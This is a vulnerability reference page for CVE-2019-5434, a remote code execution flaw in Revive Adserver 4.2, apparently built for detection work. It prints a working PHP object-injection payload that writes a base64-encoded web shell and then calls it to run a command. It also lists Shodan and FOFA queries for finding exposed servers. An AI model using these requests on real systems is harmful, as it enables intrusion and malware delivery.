---
layout: post
cve_id: CVE-2019-5434
title: Revive Adserver 4.2 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2019/CVE-2019-5434.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-5434.yaml
snort2_rule: N/A
snort3_rule: N/A
author: omarjezi
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the target system.

  '
remediation: 'Apply the latest security patches or upgrade to a newer version of Revive
  Adserver.

  '
reference:
- https://packetstormsecurity.com/files/155559/Revive-Adserver-4.2-Remote-Code-Execution.html
- https://www.exploit-db.com/exploits/47739
- https://www.revive-adserver.com/security/revive-sa-2019-001/
- https://nvd.nist.gov/vuln/detail/CVE-2019-5434
- http://packetstormsecurity.com/files/155559/Revive-Adserver-4.2-Remote-Code-Execution.html
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-5434
  cwe-id: CWE-502
  epss-score: 0.91979
  epss-percentile: 0.99682
  cpe: cpe:2.3:a:revive-sas:revive_adserver:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: revive-sas
  product: revive_adserver
  shodan-query:
  - http.favicon.hash:106844876
  - http.title:"revive adserver"
  fofa-query:
  - icon_hash=106844876
  - title="revive adserver"
  google-query: intitle:"revive adserver"
tags:
- cve
- cve2019
- edb
- packetstorm
- revive
- adserver
- rce
- revive-sas
- vuln
---

## üîç Vulnerability Description
Revive Adserver 4.2 is susceptible to remote code execution. An attacker can send a crafted payload to the XML-RPC invocation script and trigger the unserialize() call on the "what" parameter in the "openads.spc" RPC method. This can be exploited to perform various types of attacks, e.g. serialize-related PHP vulnerabilities or PHP object injection. It is possible, although unconfirmed, that the vulnerability has been used by some attackers in order to gain access to some Revive Adserver instances and deliver malware through them to third-party websites.


## üåê HTTP Request
```nohighlight
POST /adxmlrpc.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Safari/605.1.15
Connection: close
Content-Length: 1403
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="ISO-8859-1"?> <methodCall> <methodName>openads.spc</methodName> <params> <param> <value> <struct> <member> <name>remote_addr</name> <value>8.8.8.8</value> </member> <member> <name>cookies</name> <value> <array> </array> </value> </member> </struct> </value> </param> <param><value><string>a:1:{S:4:"what";O:11:"Pdp\Uri\Url":1:{S:17:"\00Pdp\5CUri\5CUrl\00host";O:21:"League\Flysystem\File":2:{S:7:"\00*\00path";S:55:"plugins/3rdPartyServers/ox3rdPartyServers/max.class.php";S:13:"\00*\00filesystem";O:21:"League\Flysystem\File":2:{S:7:"\00*\00path";S:66:"x://data:text/html;base64,PD9waHAgc3lzdGVtKCRfR0VUWyIwIl0pOyA/Pg==";S:13:"\00*\00filesystem";O:29:"League\Flysystem\MountManager":2:{S:14:"\00*\00filesystems";a:1:{S:1:"x";O:27:"League\Flysystem\Filesystem":2:{S:10:"\00*\00adapter";O:30:"League\Flysystem\Adapter\Local":1:{S:13:"\00*\00pathPrefix";S:0:"";}S:9:"\00*\00config";O:23:"League\Flysystem\Config":1:{S:11:"\00*\00settings";a:1:{S:15:"disable_asserts";b:1;}}}}S:10:"\00*\00plugins";a:1:{S:10:"__toString";O:34:"League\Flysystem\Plugin\ForcedCopy":0:{}}}}}}}</string></value></param> <param><value><string>0</string></value></param> <param><value><string>dsad</string></value></param> <param><value><boolean>1</boolean></value></param> <param><value><boolean>0</boolean></value></param> <param><value><boolean>1</boolean></value></param> </params> </methodCall>
```

```nohighlight
GET /plugins/3rdPartyServers/ox3rdPartyServers/max.class.php?0=id HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

